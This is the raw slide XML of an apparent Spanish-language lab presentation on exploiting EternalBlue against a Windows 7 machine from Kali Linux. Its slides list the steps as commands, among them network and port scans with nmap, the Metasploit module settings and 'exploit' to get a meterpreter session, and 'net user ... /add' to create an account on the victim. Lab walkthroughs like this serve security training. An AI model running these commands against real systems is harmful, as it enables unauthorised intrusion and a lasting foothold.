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1" r:id="rId5"/>
    <p:sldId id="270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66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Práctica </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> en W7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/>
              <a:t>Comandos para vulnerar un SO con W7 mediante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dirty="0"/>
              <a:t>la vulneración de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> desde Kali</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Luis Reyes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0" err="1"/>
              <a:t>Volquez</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" b="1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/>
              <a:t>ifconfig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01499" y="2105705"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para ver las interfaces de red y toda la información que estas tienen (como la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>netmask</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>…).</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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75BB7C3E-FD3D-6D88-BF77-1C94231290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105705"/>
            <a:ext cx="5181600" cy="2977183"/>
          </a:xfr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18A16D1B-995F-4227-0B70-D5216D7A5D4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7061200" y="2622550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F436B4B-4587-095E-FE4A-6E19A0E43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2622550"/>
            <a:ext cx="838200" cy="1238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8A14311-EF2C-533D-FE79-307587792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0" y="2622550"/>
            <a:ext cx="838200" cy="12382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F8F45373-5100-52C6-87C2-77ED55F67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0" y="4067969"/>
            <a:ext cx="591035" cy="87312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F7E8FB8E-9F9F-BB22-F4B1-581CE84FB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0" y="4049713"/>
            <a:ext cx="838200" cy="12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37798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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>arp-scan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -I [interfaz de red] --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>localnet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="es-ES" dirty="0"/>
            </a:b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047694"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para ver las </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> que están conectadas a la red</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" dirty="0"/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19FDA8AA-EF4C-DA67-D8F6-1B84ABC4D2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85350"/>
            <a:ext cx="5181600" cy="3631888"/>
          </a:xfr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AE50770-5883-BA3C-AB6B-B6567D8886F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7423150" y="2374900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36E2BB0-71F2-E5B6-3D9B-3F1080873FF7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7537450" y="2632075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8CA5987-75FC-5398-056C-E1EA174D9997}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7626350" y="3792856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3D0CD4E-0B58-CEFD-819A-4819F8B40E1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7626350" y="3387725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39B7A8D-C9DE-EE64-EF1A-AF85C08F7684}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7537450" y="3046413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98B7F6B-3FFD-4A9E-6232-8EAE24A6D489}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7626350" y="4144012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2982DE3-DEC0-602E-7DE4-90824BE17276}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7626350" y="4521519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5518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07143-FB56-A407-956D-C372573FA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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>sn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>]/[prefijo de red]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A69C63-D15C-94D9-9FA1-BEC97DDEE9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también para saber los dispositivos que están conectados a la red</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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4AC7B19-5B62-2D76-11CF-CA9F035A97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885755"/>
            <a:ext cx="5181600" cy="2231078"/>
          </a:xfr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C287648-3C8C-1126-3A48-339832BE82B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7454900" y="3076895"/>
            <a:ext cx="88265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7354A0F-C9BF-509B-1527-EB054339DA98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670800" y="3746500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FD6B5A7-061F-4E7D-F6C3-AB598ECA21E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670800" y="3375985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84A0A9E-8EAC-8894-C3DF-2B7FCA58C879}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670800" y="4117015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3184FFF-E9FF-A4DE-8215-26D596F66654}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7670800" y="4625027"/>
            <a:ext cx="8255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78003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ping –c [numero de paquetes que se quieren enviar] [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="es-ES" dirty="0"/>
            </a:b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047694"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para darle un ping a las </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> y en este caso la utilizamos para saber además la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> de la victima, probamos con todas para averiguar a cual vulneramos.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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83E04F5-621D-6593-758A-691921F7BA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9108" y="2047694"/>
            <a:ext cx="5134692" cy="1390844"/>
          </a:xfr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94B98A7-2DED-0821-3A68-23C7C8ABBB75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7289800" y="2292350"/>
            <a:ext cx="11049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3020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sudo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -p- -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>sCV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>vvv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -min-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>rate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> 5000  [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> a vulnerar]</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="es-ES" dirty="0"/>
            </a:b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047694"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para conocer los puertos abiertos y los servicios que los mantienen abiertos de nuestra victima.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" dirty="0"/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830D5DBB-5F4E-35F8-D3C3-3197810A4C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48400" y="2047694"/>
            <a:ext cx="5181600" cy="2849879"/>
          </a:xfr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614CE89-DC3C-8D41-6F21-7E470A6A3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137" y="2286000"/>
            <a:ext cx="885825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5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br>
              <a:rPr lang="es-ES" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="es-DO" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="32" name="Marcador de contenido 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2114CB62-DB54-EAD4-69C2-68B8DB3A2D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86087" y="3944144"/>
            <a:ext cx="885825" cy="114300"/>
          </a:xfrm>
        </p:spPr>
      </p:pic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CBEF3B20-2705-5691-F182-C88382CE7B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0BA332E-88C6-23B5-F1BD-43344E947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4541921" cy="3429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4BA2BDB-83E5-5335-796F-D7F273A4B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0480"/>
            <a:ext cx="4558381" cy="301752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21F0563-3068-4BD4-19F9-D44E94095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0"/>
            <a:ext cx="5181600" cy="3432911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2EB0CAA-6791-DCF2-C593-833615B4F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3576832"/>
            <a:ext cx="5200650" cy="3281167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51AD1D51-1120-AE27-7801-7EDF4FC05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41094"/>
            <a:ext cx="885825" cy="114300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680B5B-28CB-4226-EBC3-005137EC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12" y="164918"/>
            <a:ext cx="885825" cy="11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15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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> --script "vuln and safe" -p </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>[puertos a vulnerar separados por comas]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>] 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3900" y="2893514"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para saber si los puertos abiertos se pueden explotar con el script “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>vuln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>safe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>”.</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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EE3E093-1970-0F83-5AFB-1906480DAE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43EB61D-DBED-699A-3F51-4939ABA70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404088"/>
            <a:ext cx="6029325" cy="363855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EEFFD8A1-E57F-8F8D-F890-0FD89BD15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2626157"/>
            <a:ext cx="885825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1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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> -q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3900" y="2893514"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para abrir la consola </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>msf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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08E27B0-6C2B-FFF3-5980-45E592D28C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697096"/>
            <a:ext cx="5181600" cy="3659955"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2349405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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue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3900" y="2893514"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para activar el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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08E27B0-6C2B-FFF3-5980-45E592D28C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779214"/>
            <a:ext cx="5181600" cy="3659955"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="177233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use 0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3900" y="2893514"/>
            <a:ext cx="5181600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para usar el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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5FE7055-E0EB-2977-A398-8DB6644B40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33416" y="3965512"/>
            <a:ext cx="8031864" cy="844795"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3358777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show </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>options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2000" y="2168174"/>
            <a:ext cx="5181600" cy="946966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para ver las opciones del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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C817E0E-BB9E-D967-EE66-E67E13ABC5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3235621"/>
            <a:ext cx="5510460" cy="3622380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6FFBF7F-7F96-D07A-18A6-4EF29BAE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235620"/>
            <a:ext cx="5181600" cy="36671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AE933B6-ACE7-FCDF-A895-58ED05573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0" y="4819650"/>
            <a:ext cx="885825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8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set RHOST [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> victima]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2000" y="2047694"/>
            <a:ext cx="5181600" cy="1015446"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Se utiliza para configurar el host remoto del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>eternalblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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9AA9D4F0-C89A-E6F6-2739-176C988C43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62999" y="3373257"/>
            <a:ext cx="6790801" cy="1015446"/>
          </a:xfr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41FF95A-BFE8-6728-A6FE-FFDC5AB6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3981450"/>
            <a:ext cx="1219200" cy="15731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8CA9C69-8886-6A0F-51A3-B73A4C717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0" y="3800017"/>
            <a:ext cx="12192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81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show </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>options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2000" y="2047694"/>
            <a:ext cx="5181600" cy="2044246"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo volvemos a utilizar para confirmar que se hay configurado y nos damos cuenta cuando en este apartado aparece la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> de la victima.</a:t>
            </a:r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648B0A-62B7-1A4F-EAD0-2E3F31FB2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0" y="2443480"/>
            <a:ext cx="6076950" cy="4267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4EFCBC-8B78-0F58-B98E-523F5226C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3429000"/>
            <a:ext cx="1219200" cy="161925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5D23B096-71F0-5921-A3C1-63D73E3730A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7391400" y="3311525"/>
            <a:ext cx="1371600" cy="558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342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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>check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2000" y="2047694"/>
            <a:ext cx="5181600" cy="2044246"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para verificar si todo nos ha salido bien.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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F4240FC-9EDB-8A45-9141-AAA37484FA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267973"/>
            <a:ext cx="5181600" cy="1466642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9030DD3-C036-10FF-C613-71CD3ED33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533776"/>
            <a:ext cx="1123950" cy="2714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783B010-435B-36DD-D58E-9FEA82083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291012"/>
            <a:ext cx="11239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75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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>exploit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390525" y="1801859"/>
            <a:ext cx="11560175" cy="695506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Lo utilizamos para explotar y ganar acceso a la maquina victima, nos damos cuenta de que fue exitoso el procedimiento cuando sale WIN y aparece el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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06CB821-35DE-2F3A-30A0-FEDB6030E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07370"/>
            <a:ext cx="5930899" cy="425062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30536B6-429E-2126-B61E-3C62469A7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642742"/>
            <a:ext cx="5819775" cy="42152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9030DD3-C036-10FF-C613-71CD3ED33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2678128"/>
            <a:ext cx="1123950" cy="33416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11C37AF-7FAA-4C55-02AF-745FB8A5B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1925" y="5106987"/>
            <a:ext cx="1123950" cy="18891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108819D-6E0E-A01D-8D47-D29D80EC4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6825" y="6123169"/>
            <a:ext cx="1123950" cy="1905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01E810F-F853-D981-9BFD-3F8DA21B2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9412" y="6135869"/>
            <a:ext cx="1123950" cy="1905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D186D04-A5B6-BC93-88B0-DB30D99A3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8737" y="2778172"/>
            <a:ext cx="1123950" cy="1905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270480D-BC24-403F-28AE-F135EF89F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25" y="2936922"/>
            <a:ext cx="1123950" cy="3755978"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Elipse 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4FD0E887-382A-BD17-80C1-7432F040610A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9515475" y="5463649"/>
            <a:ext cx="1320800" cy="3996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789384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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>shell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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para entrar al CMD de la victima.</a:t>
            </a:r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17FC48-1FA3-849B-4814-396507932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733494"/>
            <a:ext cx="50482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1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net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> [nombre de usuario] [contraseña] /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>add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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para crear un usuario en la maquina victima.</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5589BC4-0283-74D1-843F-5078B0B8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5" y="2733494"/>
            <a:ext cx="60864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3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net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>user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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para verificar si se creo exitosamente el usuario en la maquina victima.</a:t>
            </a:r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2E0CCB-22CC-159D-2F97-B124D10FE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082" y="2733494"/>
            <a:ext cx="60864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05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Comandos cd..   Y   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>dir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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para cambiar de directorios.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para enlistar los </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>dirctorios</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" dirty="0"/>
          </a:p>
          <a:p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BB35C4-447C-DC08-9635-3AF9749B5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590" y="2733494"/>
            <a:ext cx="6093910" cy="358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4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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>nul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> &gt; [nombre].txt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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para crear un documento.</a:t>
            </a:r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72A57F-723C-5DDA-ED13-6834E2090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845" y="2733494"/>
            <a:ext cx="6108245" cy="375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39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Comando </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>exit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>   y   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>screenshot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0500" y="2733494"/>
            <a:ext cx="4724400" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para salir de la consola CMD de la maquina victima.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Lo utilizamos para hacer una captura de pantalla del escritorio de la victima.</a:t>
            </a:r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72FB2C-D9FC-7677-91D3-B719643B2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594" y="2778898"/>
            <a:ext cx="7095906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70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22131"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
